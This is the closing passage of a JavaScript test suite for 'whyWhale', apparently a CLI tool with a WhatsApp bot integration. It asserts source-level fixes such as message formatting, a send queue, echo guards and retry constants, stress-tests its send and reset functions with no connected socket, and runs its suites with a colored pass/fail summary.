    'onDisconnected does not clear ctx.waClient — stale socket reference after disconnect');

  assert('fix #3: getActiveSock imported in lib/main/index.js',
    mainIdxSrc.includes('getActiveSock'),
    'getActiveSock not imported — ctx.waClient can never be set');

  // ── Fix #4: sendMessage always called with { text: } object ──────────────
  // Find every waClient.sendMessage call and ensure none pass a raw variable
  const rawSendRe = /waClient\.sendMessage\s*\([^)]+,\s*(?!\{)[a-zA-Z_][a-zA-Z0-9_]*\s*[),]/g;
  const rawMatches = cmdConnSrc.match(rawSendRe) || [];
  assert('fix #4: no sendMessage call passes a raw string variable',
    rawMatches.length === 0,
    `Found ${rawMatches.length} raw-string sendMessage call(s): ${rawMatches.join(' | ')}`);

  assert('fix #4: shorthand send uses { text: message }',
    cmdConnSrc.includes('{ text: message }'),
    'Shorthand /wa send still passes raw message string to Baileys');

  assert('fix #4: wizard send uses { text: msg }',
    cmdConnSrc.includes('{ text: msg }'),
    'Interactive /wa wizard still passes raw msg string to Baileys');

  // ── Architecture checks ───────────────────────────────────────────────────
  assert('message queue (_msgQueue) implemented',
    waIndexSrc.includes('_msgQueue'), 'No message queue — concurrent messages can corrupt socket');

  assert('queue drain function (_drainMsgQueue) exists',
    waIndexSrc.includes('_drainMsgQueue'), 'Queue drain missing');

  assert('_sentByBot dedup set prevents echo loops',
    waIndexSrc.includes('_sentByBot'), 'No _sentByBot guard — bot will reply to its own messages');

  assert('farewell one-shot guard (_farewellSent) exists',
    waIndexSrc.includes('_farewellSent'), 'No farewell guard — shutdown message may send multiple times');

  assert('stdout noise filter (installStdoutFilter) installed',
    waIndexSrc.includes('installStdoutFilter') || waIndexSrc.includes('NOISE'),
    'No stdout noise filter — Baileys protocol dumps will pollute terminal');

  // ── Constants sanity ─────────────────────────────────────────────────────
  assert('RETRY_440_MS is defined', waIndexSrc.includes('RETRY_440_MS'));
  const retryMatch = waIndexSrc.match(/RETRY_440_MS\s*=\s*(\d+)(?:_(\d+))?/);
  if (retryMatch) {
    const ms = parseInt(retryMatch[0].replace(/[^0-9]/g,'').replace('RETRY440MS',''));
    // parse properly: handle 15_000 notation
    const raw = retryMatch[0].replace(/RETRY_440_MS\s*=\s*/, '').replace(/_/g, '');
    const msVal = parseInt(raw);
    assert('RETRY_440_MS is between 5s and 60s', msVal >= 5000 && msVal <= 60000,
      `RETRY_440_MS = ${msVal}ms`);
  }

  const maxMatch = waIndexSrc.match(/MAX_RETRIES\s*=\s*(\d+)/);
  assert('MAX_RETRIES is defined and in range 1-10',
    maxMatch ? (parseInt(maxMatch[1]) >= 1 && parseInt(maxMatch[1]) <= 10) : false,
    maxMatch ? `MAX_RETRIES = ${maxMatch[1]}` : 'not found');

  assert('MSG_ONLINE contains whale emoji',   waIndexSrc.includes('🐋'));
  assert('MSG_OFFLINE contains fish emoji',   waIndexSrc.includes('🐟') || waIndexSrc.includes('🎣'));

  assert('sendToOwner uses { text } object not raw arg',
    waIndexSrc.match(/sendMessage\(_ownerJid,\s*\{\s*text\s*\}/) ||
    waIndexSrc.match(/sendMessage\(_ownerJid,\s*\{\s*text:/),
    'sendToOwner passes raw text to sendMessage — will crash on send');

  // ── Behaviour stress: no active socket ────────────────────────────────────
  let sendThrew = false;
  for (let i = 0; i < 100; i++) {
    try { await sendToOwner('stress test message ' + i); }
    catch (_) { sendThrew = true; break; }
  }
  assert('stress: sendToOwner(×100) never throws when socket is null', !sendThrew);

  let farewellThrew = false;
  for (let i = 0; i < 50; i++) {
    try { await sendFarewellMessage(); }
    catch (_) { farewellThrew = true; break; }
  }
  assert('stress: sendFarewellMessage(×50) never throws with no socket', !farewellThrew);

  let resetThrew = false;
  for (let i = 0; i < 50; i++) {
    try { resetSession(); }
    catch (_) { resetThrew = true; break; }
  }
  assert('stress: resetSession(×50) never throws', !resetThrew);
  assert('getActiveSock() still null after resetSession loop', getActiveSock() === null);

  // ── Concurrent sendToOwner calls ─────────────────────────────────────────
  let concurrentThrew = false;
  try {
    await Promise.all(Array.from({ length: 200 }, (_, i) => sendToOwner('concurrent ' + i)));
  } catch (_) { concurrentThrew = true; }
  assert('stress: 200 concurrent sendToOwner calls never throw', !concurrentThrew);

  // ── Source: no other file in lib/ calls delete require.cache for WA ──────
  const libFiles = fs.readdirSync(LIB).filter(f => f.endsWith('.js'));
  let rogue = [];
  for (const f of libFiles) {
    if (f === 'connections.js') continue; // this one is expected
    const src = fs.readFileSync(path.join(LIB, f), 'utf8');
    if (src.includes('delete require.cache') && src.includes('whatsapp')) rogue.push(f);
  }
  assert('no rogue require.cache busts for WA module in lib/*.js',
    rogue.length === 0, `Rogue files: ${rogue.join(', ')}`);
}

// ══════════════════════════════════════════════════════════════════════════════
// MAIN
// ══════════════════════════════════════════════════════════════════════════════
async function main() {
  console.log('\n' + bd('╔══════════════════════════════════════════════════════════════╗'));
  console.log(       bd('║       🐋  whyWhale — MEGA EXTREME STRESS TEST SUITE         ║'));
  console.log(       bd('╚══════════════════════════════════════════════════════════════╝'));
  console.log(gr('  Working dir: ' + __dirname));
  console.log(gr('  Node:        ' + process.version));
  console.log(gr('  Started:     ' + new Date().toISOString()));
  console.log(gr('  Suites:      14  |  Target: 600+ assertions'));

  const filter = process.argv[2]?.toLowerCase();

  const suites = [
    ['autodetect',   runAutoDetect],
    ['dmpolicy',     runDmPolicy],
    ['commands',     runCommands],
    ['modes',        runModes],
    ['colors',       runColors],
    ['filesystem',   runFilesystem],
    ['providers',    runProviders],
    ['memory',       runMemory],
    ['config',       runConfig],
    ['sessioncache', runSessionCache],
    ['render',       runRender],
    ['connections',  runConnections],
    ['stress',       runStress],
    ['whatsapp',     runWhatsApp],
  ];

  for (const [name, fn] of suites) {
    if (filter && !name.startsWith(filter)) continue;
    try { await fn(); }
    catch (e) {
      console.log(r('\n  ✘ Suite crashed: ') + e.message);
      _failures.push(`[${name}] Suite crashed: ${e.message}`);
      _fail++;
    }
  }

  // Cleanup temp dir
  try { fs.rmSync(TMP, { recursive: true, force: true }); } catch (_) {}

  // ── Summary ───────────────────────────────────────────────────────────────
  const total = _pass + _fail + _skip;
  console.log('\n' + bd('━'.repeat(62)));
  console.log(bd('  RESULTS'));
  console.log('  ' + g(`✔ Passed:  ${_pass}`));
  if (_fail > 0) console.log('  ' + r(`✘ Failed:  ${_fail}`));
  if (_skip > 0) console.log('  ' + y(`⊘ Skipped: ${_skip}`));
  console.log(gr(`  Total:    ${total}`));

  if (_failures.length > 0) {
    console.log('\n' + r(bd('  FAILURES')));
    _failures.forEach((f, i) => console.log('  ' + r(`${i + 1}.`) + ' ' + f));
  }

  console.log(bd('━'.repeat(62)));
  console.log((_fail === 0
    ? g(bd('  ✔ ALL TESTS PASSED'))
    : r(bd(`  ✘ ${_fail} TEST(S) FAILED`))) + '\n');

  process.exit(_fail > 0 ? 1 : 0);
}

main().catch(e => {
  console.error(r('\nFatal error: ') + e.message);
  console.error(e.stack);
  process.exit(1);
});